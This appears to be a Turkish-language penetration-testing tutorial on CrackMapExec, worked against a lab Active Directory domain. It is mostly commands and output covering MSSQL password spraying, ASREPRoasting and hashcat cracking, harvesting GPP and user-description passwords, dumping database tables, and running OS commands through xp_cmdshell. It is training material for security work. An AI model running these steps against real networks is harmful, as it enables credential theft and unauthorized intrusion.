Microsoft SQL Server (MSSQL), verileri tablolarda, sütunlarda ve satırlarda saklayan ilişkisel bir veritabanı yönetim sistemidir. Veritabanları hostları, kullanıcı kimlik bilgileri, Personal Identifiable Information (PII), işle ilgili veriler ve ödeme bilgileri dahil ancak bunlarla sınırlı olmamak üzere her türlü hassas verinin depolanmasından sorumlu oldukları için yüksek hedef olarak kabul edilirler.


### MSSQL Authentication Mechanisms

MSSQL iki [authentication modunu](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server) destekler, bu da kullanıcıların Windows veya SQL Server'da oluşturulabileceği anlamına gelir:

| **Authentication Type**         | **Description**                                                                                                                                                                                                                                                                                                                                                                    |
| ------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Windows authentication mode** | Bu, varsayılan olan ve genellikle entegre güvenlik olarak adlandırılan moddur, çünkü SQL Server güvenlik modeli Windows/Active Directory ile sıkı bir şekilde entegre edilmiştir. Belirli Windows kullanıcıları ve grup hesapları SQL Server'a giriş yapmaya yetkilidir. Zaten kimlik doğrulaması yapılmış Windows kullanıcılarının, ek kimlik bilgileri sunmalarına gerek yoktur. |
| **Mixed mode**                  | Mixed mode, Windows/Active Directory hesapları ve SQL Server kimlik doğrulamasını destekler. Kullanıcı adı ve şifre çiftleri SQL Server içinde saklanır.                                                                                                                                                                                                                           |

Bu, `MSSQL`'de kimlik doğrulaması yapmak için üç tür kullanıcıya sahip olabileceğimiz anlamına gelir:

1. Active Directory Account. 
2. Local Windows Account. 
3. SQL Account.

Bir Active Directory hesabı için domain adını belirtmemiz gerekir:

### Password Spray - Active Directory Account

```
crackmapexec mssql 10.129.203.121 -u julio grace jorge -p Inlanefreight01!

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL 10.129.203.121 1433 DC01 [-]
ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an
untrusted domain and cannot be used with Integrated authentication.
MSSQL 10.129.203.121 1433 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!

```

Lokal bir Windows Hesabı için, domain seçeneği `-d` veya hedef makine adı olarak bir nokta (`.`) belirtmemiz gerekir:

### Password Spray - Local Windows Account

```
crackmapexec mssql 10.129.203.121 -u julio grace -p Inlanefreight01! -d .

MSSQL 10.129.203.121 1433 None [*] None
(name:10.129.203.121) (domain:.)
MSSQL 10.129.203.121 1433 None [-]
ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an
untrusted domain and cannot be used with Integrated authentication.
MSSQL 10.129.203.121 1433 None [+]
.\grace:Inlanefreight01!

```

Not: Bu bir Domain Controller olduğundan, Windows local hesapları kullanılmamıştır. Bu örnek, local windows hesapları ile Domain Controller olmayan bir makine hedeflendiğinde geçerli olacaktır.

Genellikle administrators, local kullanım veya test için Active Directory hesaplarıyla aynı isimde hesaplar oluşturabilirler. Active Directory hesabı ile aynı ad ve parola ile oluşturulmuş MSSQL hesapları bulabiliriz. Parolanın yeniden kullanımı çok yaygındır! Bir SQL Hesabı denemek istiyorsak, `--local-auth` bayrağını belirtmemiz gerekir:


### Password Spray - SQL Account

```
crackmapexec mssql 10.129.203.121 -u julio grace -p Inlanefreight01! --
local-auth

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [-]
ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user 'julio'.
MSSQL 10.129.203.121 1433 DC01 [+]
grace:Inlanefreight01!
```

Gördüğümüz gibi, grace hesabı aynı parola ile MSSQL veritabanında local olarak mevcuttur.

### Other Protocols

Unutmayın ki, bazen bir kullanıcı administrator olmayabilir, ancak RDP, SSH, FTP gibi diğer protokollere erişim yetkisine sahip olabilir. Bu, Password Spraying yaparken hedefi anlamanın ve olabildiğince çok protokole saldırı yapmanın önemli olduğu bir durumdur.

Not: Active Directory kimlik doğrulaması kullanarak Password Spray yaparken, başarısız şifre deneme sayısı tüm protokoller için aynı olacaktır. Örneğin, eğer kilitlenme sınırı beş deneme ise ve biz üç şifreyi RDP üzerinden, iki şifreyi ise WinRM karşısında denersek, toplamda 5'e ulaşılacak ve hesabın kilitlenmesine sebep olacağız.


### Next Steps

Bu bölümde, geçerli kimlik bilgilerini belirlemeye ve domain'e erişim sağlamaya çalışmak için bir kullanıcı listesi kullanarak farklı protokollere karşı Password Spraying'in nasıl gerçekleştirileceğini öğrendik. Bir sonraki bölümde, `brute forcing` veya `Password` `Spray` olmadan hesapları tanımlamak için diğer mekanizmalar tartışılacaktır.


### Finding ASREPRoastable Accounts

ASREPRoast saldırısı, Kerberos `pre-authentication (ön kimlik doğrulaması)` gerekmeyen kullanıcıları arar. Bu, herhangi birinin bu kullanıcılardan herhangi biri adına KDC'ye bir `AS_REQ` isteği gönderebileceği ve bir `AS_REP` mesajı alabileceği anlamına gelir. Bu son tür mesaj, şifresinden türetilen orijinal `user anahtarıyla` şifrelenmiş bir veri parçası içerir. Daha sonra, bu mesaj kullanılarak, kullanıcı nispeten zayıf bir parola seçtiyse, kullanıcı parolası `çevrimdışı` olarak kırılabilir. 

Domain üzerinde bir hesabımız yoksa ancak bir kullanıcı adı listemiz varsa, belki şansımız yaver gider ve Kerberos pre-authentication gerektirmeyen seçeneğe sahip bir hesap bulabiliriz. Bu seçenek ayarlanmışsa, kullanıcının şifresiyle çözülebilen şifrelenmiş verileri bulmamızı sağlar.

Daha önce `--asreproast` seçeneği ile bulduğumuz kullanıcı listesi ile LDAP protokolünü kullanabilir ve ardından bir dosya adı ve DC'nin FQDN'sini hedef olarak belirtebiliriz. Bu saldırıya karşı savunmasız en az bir hesap olup olmadığını belirlemek için `users.txt` dosyasının içindeki her hesabı arayacağız:

### ASREPRoast için Bruteforcing Hesapları

```
crackmapexec ldap dc01.inlanefreight.htb -u users.txt -p '' --asreproast
asreproast.out

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 445 DC01 [email
protected]:1674ae058d5280dbc25ee678ee938c71$7277ce57387d449dd80c5e9d9a9b94
0a91e1f720e506ce910d7b48ad9faa97d10e32dc265101ad14b097e5755108278a4f32bb62
3d716478a600c5301e03db8e97165b0d0229155cef2a34d40f57841c0a7a1a0d0fed693b23
1e81940d70f127d20af8e6a1e813d663484c3073ed8ba8f2e117f15f8def6ebda88fc45baf
59a6fbee01d87dce18051b9159e38a2869a5fdffa0ccffde4ac5ae45a75f978ac958f0d23b
2e36fa05cbfe13f38ca7ea4311e859d85b1c29e4ce226c72c09e25127a96a18f7afc8d2c73
67a2dc14d61954b9e63812f5787e3ce5e2dc403674549e0bb18e76f758b4c04ad46ff34945
9fcb777b78d50fb876
```

Listemize dayanarak, ASREPRoasting'e karşı savunmasız bir hesap bulduk. `Geçerli kimlik bilgilerimiz varsa`  Kerberos pre-authentication gerektirmeyen tüm hesapları talep edebiliriz. ASREPRoast'a karşı savunmasız tüm hesapları istemek için Grace'in kimlik bilgilerini kullanalım.


### Search for ASREPRoast Accounts

```
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! --
asreproast asreproast.out

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
LDAP dc01.inlanefreight.htb 389 DC01 [*] Total of
records returned 6
LDAP dc01.inlanefreight.htb 389 DC01 [email
protected]:5567a4d9df8894497ce50c74c15cbe74$ea2eeece92c1314848071449c4061f
1c8e0153a5e91deaec56a1009b33aa4aa8fd86f9a17d8012629ee31aa525eeb98c1a9fc873
f1db27935f79d6fe8a9edc43116afcfdc161d1f90e48baf5d25691f418254ffe9e68c9ff36
ded80b81e165a61fc3867202fcd0e5279d45509024e728e792a1dede3deedb522028d4c76d
b8f7f819775136c350727d83f00cc9ddddcb1df1813cc7a4c299352af22d61a746bb84c6c9
de8e501ed35e630a424fb560349d827b23658081c1bab64e7a208eab6af974d972ad8f445f
b3cbb55a0d294429a5be20472e92963c4ebd7e39ad49cd47661d6d3b7045a3200454b6deb6
e88fcdac3d0a81326c
LDAP dc01.inlanefreight.htb 389 DC01 [email
protected]:be96a4ea9e79a3f21c2984fc8b75d1f6$34c5bd1641d4588248348b6b91713d
45f60f37c5153369101af2b4294906c729a516fdea8c474f5e470d4d465bfa5d43dbbfe8e4
5cc1f1d12b0802796af3dd629f5be07282c9024be029ffb1c6243f0139a943b89952833a7a
7794ac77372dc107fbd14cd6ebe084a6c3123651d75ddd46a7406d68a8711e8e11257cfdda
71e0c13c8f5a9852afb0a0b9e3acc8856655987d3725f495e15ee56fb94f10df0a247d04ef
967b252000782b8debb410cb7a4f60a2704b3aa8a3ed3d444d2b6d2e96bb93086bb64407a1
cd4b240cb41955b446753795e2855f54d11d49360a5998df52a9a92f761477e66fc01972cb
46b818a680c7f97854
```

Tüm hash'leri aldıktan sonra, `18200` modülü ile `Hashcat`'i kullanabilir ve bunları kırmayı deneyebiliriz. `rockyou.txt` kelime listesini kullanalım ve bu hash'leri kırmaya çalışalım:


### Password Cracking

```
hashcat -m 18200 asreproast.out /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...
<SNIP>
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921355
* Keyspace..: 14344386
[email
protected]:40d78fb0fd99b5070f8e519670e72f01$728671cd74bfb9b009f4e4dc7b5206
e4f45c3497b1e097fb47d9ddcee8211928d857cd8d11e6c7b9e4ced73806974a8db226c3cf
b14962cab03f7c6d85c5670ecbcf513d99d28f1e6445de81c7ee3c29641eb633457ed7b53d
40deba514a2e06d08759111628afd9b91a683622b6fed872d85f6a2e083237d4bb8d3ac43d
dd4fb7198389969bcc6282066fd34fcf06945806679e5eccc215a7034ac88bb2f2f068a4fb
176bcc3a48396cdf152614ec8a634bac8745e18e23d135afef234def28c53a74e930c315c8
666de1d63165317c7454460af3bf711a5c3006f498d2a1ee532cf537b97a991a2dc71d6de9
5ae8ca64c2c7cd8301:Password!
<SNIP>
```

Domain üzerinde geçerli bir hesap bulmanın başka bir yolunu bulduk, bu da ortam hakkında çok daha fazla bilgi toplamamızı ve belki de hosts veya diğer kullanıcıları tehlikeye atmaya başlamamızı sağlayacaktı

----

### Group Policy Objelerinde Hesapları Arama

Bir hesabın kontrolünü ele geçirdiğimizde, gerçekleştirmemiz gereken bazı zorunlu kontroller vardır. `Group Policy Objects'de (GPO)` yazılı kimlik bilgilerini aramak, özellikle eski bir ortamda (Windows server 2003 / 2008) işe yarayabilir, çünkü her domain kullanıcısı `GPO`'ları okuyabilir.

CrackMapExec, tüm GPO'ları arayacak ve ilginç kimlik bilgilerini bulacak iki modüle sahiptir. `gpp_password` ve `gpp_autologin` modüllerini kullanabiliriz. İlk modül olan gpp_password, `Group Policy Preferences (GPP)` aracılığıyla gönderilen hesaplar için düz metin parolasını ve diğer bilgileri alır. Bu saldırı hakkında daha fazla bilgiyi [Password Discovery and Group Policy Preference Abuse in SYSVOL blog](https://adsecurity.org/?p=2288) yazısında okuyabilirsiniz. İkinci modül olan `gpp_autologin`, `autologin` bilgilerini bulmak için Domain Controller'daki `registry.xml` dosyalarını arar ve varsa kullanıcı adını ve açık metin parolasını döndürür.

### Password GPP

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M
gpp_password
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
GPP_PASS... 10.129.203.121 445 DC01 [+] Found SYSVOL share
GPP_PASS... 10.129.203.121 445 DC01 [*] Searching for
potential XML files containing passwords
GPP_PASS... 10.129.203.121 445 DC01 [*] Found
inlanefreight.htb/Policies/{31B2F340-016D-11D2-945F00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
GPP_PASS... 10.129.203.121 445 DC01 [+] Found credentials
in inlanefreight.htb/Policies/{31B2F340-016D-11D2-945F00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
GPP_PASS... 10.129.203.121 445 DC01 Password:
Inlanefreight1998!
GPP_PASS... 10.129.203.121 445 DC01 action: U
GPP_PASS... 10.129.203.121 445 DC01 newName:
GPP_PASS... 10.129.203.121 445 DC01 fullName:
GPP_PASS... 10.129.203.121 445 DC01 description:
GPP_PASS... 10.129.203.121 445 DC01 changeLogon: 0
GPP_PASS... 10.129.203.121 445 DC01 noChange: 1
GPP_PASS... 10.129.203.121 445 DC01 neverExpires: 1
GPP_PASS... 10.129.203.121 445 DC01 acctDisabled: 0
GPP_PASS... 10.129.203.121 445 DC01 userName:
inlanefreight.htb\engels
```


### AutoLogin GPP

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M
gpp_autologin
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
GPP_AUTO... 10.129.203.121 445 DC01 [+] Found SYSVOL share
GPP_AUTO... 10.129.203.121 445 DC01 [*] Searching for
Registry.xml
GPP_AUTO... 10.129.203.121 445 DC01 [*] Found
inlanefreight.htb/Policies/{C17DD5D1-0D41-4AE9-B393-
ADF5B3DD208D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 10.129.203.121 445 DC01 [+] Found credentials
in inlanefreight.htb/Policies/{C17DD5D1-0D41-4AE9-B393-
ADF5B3DD208D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 10.129.203.121 445 DC01 Usernames: ['kiosko']
GPP_AUTO... 10.129.203.121 445 DC01 Domains:
['INLANEFREIGHT']
GPP_AUTO... 10.129.203.121 445 DC01 Passwords:
['SimplePassword123!']
```

Bizim durumumuzda, iki farklı parolaya sahip iki hesap bulduk. Bu hesapların hala geçerli olup olmadığını kontrol edelim:

### Credentials Validation

```
crackmapexec smb 10.129.203.121 -u engels -p Inlanefreight1998! SMB 

10.129.203.121 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False) SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\engels:Inlanefreight1998!
```

```
crackmapexec smb 10.129.203.121 -u kiosko -p SimplePassword123! SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False) SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\kiosko:SimplePassword123!
```

Her iki hesap da hala geçerlidir ve bunları domain'de kimlik doğrulaması yapmak için kullanabilir, hangi ayrıcalıklara sahip olduklarını belirleyebilir veya bu kimlik bilgilerini yeniden kullanmayı deneyebiliriz

Bu bölüm bize kimlik bilgilerini elde etmek için GPO yapılandırmalarını kötüye kullanmanın birkaç yöntemini öğretti. Bir sonraki bölümde, kimliği doğrulanmış bir kullanıcı olarak daha fazla bilgi toplamanın yollarını tartışmaya devam edeceğiz

### Modüllerle Çalışma

Daha önce tartıştığımız gibi, her CrackMapExec protokolü modülleri destekler. Belirtilen protokol için mevcut modülleri görüntülemek için `crackmapexec protocol -L` komutunu çalıştırabiliriz. Örnek olarak LDAP protokolünü kullanalım.

### LDAP için Mevcut Modülleri Görüntüle

```
crackmapexec ldap -L

[*] MAQ Retrieves the MachineAccountQuota domainlevel attribute
[*] adcs Find PKI Enrollment Services in Active
Directory and Certificate Templates Names
[*] daclread Read and backup the Discretionary Access
Control List of objects. Based on the work of @_nwodtuhs and @BlWasp_. Be
carefull, this module cannot read the DACLS recursively, more explains in
the options.
[*] get-desc-users Get description of the users. May contained
password
[*] get-network
[*] laps Retrieves the LAPS passwords
[*] ldap-checker Checks whether LDAP signing and binding are
required and / or enforced
[*] ldap-signing Check whether LDAP signing is required
[*] subnets Retrieves the different Sites and Subnets of
an Active Directory
[*] user-desc Get user descriptions stored in Active
Directory
[*] whoami Get details of provided user
```

`User-desc` modülünü seçelim ve modüllerle nasıl etkileşime girebileceğimizi görelim

Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir. Hedef IP'yi FQDN `dc01.inlanefreight.htb` olarak yapılandırın.


### Modüllerde Seçeneklerin Tanımlanması

Bir CrackMapExec modülü, bazı özel değerler ayarlamak için farklı seçeneklere sahip olabilir. MAQ gibi seçeneklere sahip olmayan modüller olabilir, bu da varsayılan eylemlerini değiştiremeyeceğimiz anlamına gelir. Bir modülün desteklenen seçeneklerini görüntülemek için aşağıdaki sözdizimini kullanabiliriz:  
`crackmapexec <protokol> -M <modül_adı> --options`


### LDAP MAQ Modülü için Seçenekleri Görüntüle

```
crackmapexec ldap -M MAQ --options
[*] MAQ module options:
None
```

### LDAP user-desc Modülü için Seçenekleri Görüntüle

```
crackmapexec ldap -M user-desc --options
[*] user-desc module options:
 LDAP_FILTER Custom LDAP search filter (fully replaces the
default search)
 DESC_FILTER An additional seach filter for descriptions
(supports wildcard *)
 DESC_INVERT An additional seach filter for descriptions (shows
non matching)
 USER_FILTER An additional seach filter for usernames (supports
wildcard *)
 USER_INVERT An additional seach filter for usernames (shows
non matching)
 KEYWORDS Use a custom set of keywords (comma separated)
 ADD_KEYWORDS Add additional keywords to the default set (comma
separated)

```

LDAP modülü olan **`user-desc`**, Active Directory domainindeki tüm kullanıcıları sorgular ve açıklamalarını alır. Varsayılan anahtar kelimelerle eşleşen kullanıcı açıklamalarını yalnızca görüntüler, ancak tüm açıklamaları bir dosyaya kaydeder.

Varsayılan anahtar kelimeler açıklamada sağlanmaz. Bu anahtar kelimelerin ne olduğunu öğrenmek istiyorsak, kaynak koda bakmamız gerekir. Kaynak kodunu **`CrackMapExec/cme/modules/`** dizininde bulabiliriz. Ardından modül adını arayabilir ve açabiliriz. Bizim durumumuzda, **`user-desc`** modülünü içeren Python script'i **`user_description.py`**'dir. Dosyayı **grep** komutuyla arayarak **keywords** kelimesini bulalım:


### user-desc Modülünün Kaynak Koduna Bakmak

```
cat CrackMapExec/cme/modules/user_description.py |grep keywords
 KEYWORDS Use a custom set of keywords (comma separated)
 ADD_KEYWORDS Add additional keywords to the default set (comma
separated)
 self.keywords = {'pass', 'creds', 'creden', 'key', 'secret',
'default'}
 ...SNIP...
```


Modülü kullanalım ve ilginç kullanıcı açıklamalarını bulalım:

### user-desc Modülünü Kullanarak Kullanıcı Açıklamasını Alma

```
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M
user-desc
SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
USER-DES... User: krbtgt -
Description: Key Distribution Center Service Account
USER-DES... User: alina -
Description: Account for testing HR App. Password: HRApp123!
USER-DES... Saved 6 user
descriptions to /home/plaintext/.cme/logs/UserDesc-10.129.203.121-
20221031_120444.log
```

Gördüğümüz gibi, `key` ve `pass` anahtar kelimelerini içeren açıklamayı görüntüler, ancak tüm açıklamalar log dosyasına kaydedilir


### Dosyayı Tüm Açıklamalarla Açma

```
cat /home/plaintext/.cme/logs/UserDesc-10.129.203.121-20221031_120444.log

User: Description:
Administrator Built-in account for administering the
computer/domain
Guest Built-in account for guest access to the
computer/domain
krbtgt Key Distribution Center Service Account
alina Account for testing HR App. Password: HRApp123!
engels Service Account for testing
testaccount pwd: Testing123!
```



### Seçeneklerle Bir Modül Kullanma

Eğer bir modül seçeneği kullanmak istiyorsak `-o` bayrağını kullanmamız gerekir. Tüm seçenekler `KEY=value` şeklinde belirtilir (msfvenom stili). Aşağıdaki örnekte, varsayılan anahtar kelimeleri ve ekran değerlerini `pwd` ve `admin` anahtar kelimeleriyle değiştireceğiz.

### Yeni Anahtar Kelimelerle user-desc Kullanma

```
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M user-desc -o KEYWORDS=pwd,admin
SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
USER-DES... User:
Administrator - Description: Built-in account for administering the
computer/domain
USER-DES... User:
testaccount - Description: pwd: Testing123!
USER-DES... Saved 6 user
descriptions to /home/plaintext/.cme/logs/UserDesc-10.129.203.121-
20221031_123727.log
```


### Kullanıcı Üyeliğini Sorgulama

`groupmembership`, bir kullanıcının ait olduğu grupları sorgulamamızı sağlayan bir başka modül örneğidir (kendi modüllerinizi nasıl oluşturacağınızı daha sonra tartışacağız). Kullanmak için `USER` seçeneği ile sorgulamak istediğimiz kullanıcıyı belirtmemiz gerekiyor.

Bu eğitimin yazıldığı sırada bu modül için bir [PR](https://github.com/byt3bl33d3r/CrackMapExec/pull/696) var, ancak indirilir ve onaylanana kadar modüller klasörüne yerleştirilirse kullanılabilir.


### Özel Modül ile Grup Üyeliğini Sorgulama

```
cd CrackMapExec/cme/modules/

wget https://raw.githubusercontent.com/PorchettaIndustries/CrackMapExec/7d1e0fdaaf94b706155699223f984b6f9853fae4/cme/modul
es/groupmembership.py -q

crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M groupmembership -o USER=julio

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
GROUPMEM... dc01.inlanefreight.htb 389 DC01 [+] User:
julio is member of following groups:
GROUPMEM... dc01.inlanefreight.htb 389 DC01 Server
Operators
GROUPMEM... dc01.inlanefreight.htb 389 DC01 Domain Admins
GROUPMEM... dc01.inlanefreight.htb 389 DC01 Domain Users

```


---


### MSSQL Enumeration and Attacks

Bir MSSQL sunucusu bulmak çok ilginçtir çünkü veritabanları genellikle saldırı operasyonlarımızı ilerletmek ve daha fazla erişim elde etmek için kullanabileceğimiz bilgiler içerir. Değerlendirmemizin amacı olan hassas verilere de erişim elde edebiliriz. Ayrıca, [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16) özelliğini kullanarak bir MSSQL veritabanı üzerinden işletim sistemi komutlarını çalıştırabiliriz.

Password Spray bölümünde tartıştığımız gibi, SQL'e üç farklı türde kullanıcı hesabı ile kimlik doğrulaması yapabiliriz. Veritabanı üzerinde hangi yetkilere sahip olduğumuzu ve hangi veritabanına erişimimiz olduğunu göz önünde bulundurmak ve veritabanı dba (veritabanı yöneticisi) kullanıcısı olup olmadığımızı doğrulamak da önemlidir.

Veritabanlarıyla çalışırken genellikle iki işlem gerçekleştiririz:

* SQL Sorgularını Yürütme
* Windows Komutlarını Yürütme

### SQL Sorgularını Yürütme

SQL sorgusu veritabanı ile etkileşim kurmamızı sağlar. Bilgi alabilir veya veritabanı tablolarına veri ekleyebiliriz. Ayrıca veritabanının yönetim ve administration farklı operasyonel işlevlerini de kullanabiliriz. Bir hesap aldıktan sonra, -q seçeneğini kullanarak bir SQL sorgusu gerçekleştirebiliriz.


### Tüm Veritabanı Adlarını Almak için SQL Sorgusu

```
crackmapexec mssql 10.129.203.121 -u grace -p Inlanefreight01! -q "SELECT name FROM master.dbo.sysdatabases"
MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL 10.129.203.121 1433 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
MSSQL 10.129.203.121 1433 DC01 name
MSSQL 10.129.203.121 1433 DC01 ----------------------
--------------------------------------------------------------------------
--------------------------------
MSSQL 10.129.203.121 1433 DC01 master
MSSQL 10.129.203.121 1433 DC01 tempdb
MSSQL 10.129.203.121 1433 DC01 model
MSSQL 10.129.203.121 1433 DC01 msdb
MSSQL 10.129.203.121 1433 DC01 core_app
MSSQL 10.129.203.121 1433 DC01 core_business

```

Bir MSSQL kullanıcısı belirtmek için `--local-auth` seçeneğini de kullanabiliriz. Bu seçeneği seçmezsek, bunun yerine bir domain hesabı kullanılacaktır.


### SQL Queries

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! - localauth -q "SELECT name FROM master.dbo.sysdatabases"

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 name
MSSQL 10.129.203.121 1433 DC01 ----------------------
--------------------------------------------------------------------------
--------------------------------
MSSQL 10.129.203.121 1433 DC01 master
MSSQL 10.129.203.121 1433 DC01 tempdb
MSSQL 10.129.203.121 1433 DC01 model
MSSQL 10.129.203.121 1433 DC01 msdb
MSSQL 10.129.203.121 1433 DC01 core_app
MSSQL 10.129.203.121 1433 DC01 core_business

```

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! - localauth -q "SELECT table_name from core_app.INFORMATION_SCHEMA.TABLES"

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 table_name
MSSQL 10.129.203.121 1433 DC01 ----------------------
--------------------------------------------------------------------------
--------------------------------
MSSQL 10.129.203.121 1433 DC01 tbl_users
```

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth -q "SELECT * from [core_app].[dbo].tbl_users"
MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 id_user
MSSQL 10.129.203.121 1433 DC01 name
MSSQL 10.129.203.121 1433 DC01 lastname
MSSQL 10.129.203.121 1433 DC01 username
MSSQL 10.129.203.121 1433 DC01 password
MSSQL 10.129.203.121 1433 DC01 -----------
MSSQL 10.129.203.121 1433 DC01 ----------------------
----------------------------
MSSQL 10.129.203.121 1433 DC01 ----------------------
----------------------------
MSSQL 10.129.203.121 1433 DC01 ----------------------
----------------------------
MSSQL 10.129.203.121 1433 DC01 ----------------------
----------------------------
MSSQL 10.129.203.121 1433 DC01 1
MSSQL 10.129.203.121 1433 DC01 b'Josh'
MSSQL 10.129.203.121 1433 DC01 b'Matt'
MSSQL 10.129.203.121 1433 DC01 b'josematt'
MSSQL 10.129.203.121 1433 DC01 b'Testing123'
MSSQL 10.129.203.121 1433 DC01 2
MSSQL 10.129.203.121 1433 DC01 b'Elie'
MSSQL 10.129.203.121 1433 DC01 b'Cart'
MSSQL 10.129.203.121 1433 DC01 b'eliecart'
MSSQL 10.129.203.121 1433 DC01 b'Motor999'
```


Veritabanlarını, tabloları ve içeriği listelemek için bazı veritabanı sorguları gerçekleştirdik. 

### Windows Komutlarını Yürütme

Bir hesap bulduğumuzda, CrackMapExec otomatik olarak kullanıcının bir DBA  (Database Administrator) hesabı olup olmadığını kontrol edecektir. Çıktıyı fark edersek `Pwn3d!` , kullanıcı bir Database Administrator'dür. DBA ayrıcalıklarına sahip kullanıcılar bir veritabanı objesine erişebilir, değiştirebilir veya silebilir ve diğer kullanıcılara haklar verebilir. Bu kullanıcı veritabanına karşı herhangi bir eylem gerçekleştirebilir.


### DBA Hesabı ile Kimlik Doğrulama

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
```

MSSQL, SQL kullanarak sistem komutlarını yürütmemizi sağlayan [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) adlı bir [extended stored procedure](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15)'e sahiptir. Bir DBA hesabı, Windows işletim sistemi komutlarını yürütmek için gereken özellikleri etkinleştirme ayrıcalıklarına sahiptir.

Bir Windows komutunu çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir:


### Executing Windows Commands

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth -x whoami

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 [+] Executed command
via mssqlexec
MSSQL 10.129.203.121 1433 DC01 ----------------------
----------------------------------------------------------
MSSQL 10.129.203.121 1433 DC01
inlanefreight\svc_mssql
```

